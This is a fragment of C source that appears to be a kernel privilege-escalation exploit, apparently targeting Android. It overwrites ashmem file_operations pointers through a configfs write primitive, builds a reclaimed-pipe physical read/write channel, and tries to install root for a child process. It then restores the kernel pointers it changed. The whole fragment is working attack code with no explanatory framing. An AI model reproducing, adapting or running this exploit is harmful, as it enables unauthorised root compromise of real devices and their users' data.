  if (getenv("A15_PIPE_RECLAIM_CHANNEL_TEST_ONLY")) {
    pr_info("cfi: running reversible reclaimed-pipe R/W test only\n");
    if (install_pipe_physrw(fd)) {
      pr_success("cfi: reclaimed-pipe read/write test passed; stopping "
                 "before root stage\n");
      rwf_configfs_disarm();
    } else {
      pr_warning("cfi: reclaimed-pipe read/write test failed\n");
    }
    cfi_last_step = 8;
    cfi_last_errno = 0;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  if (getenv("A15_PIPE_RECLAIM_CHANNEL_DIRECT") &&
      !rwf_configfs_disarm()) {
    pr_warning("cfi: direct pipe channel disarm failed after root stage\n");
  }
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  if (getenv("A15_PIPE_RECLAIM_CHANNEL_DIRECT"))
    rwf_configfs_disarm();
  SYSCHK(close(fd));
  return 0;
}
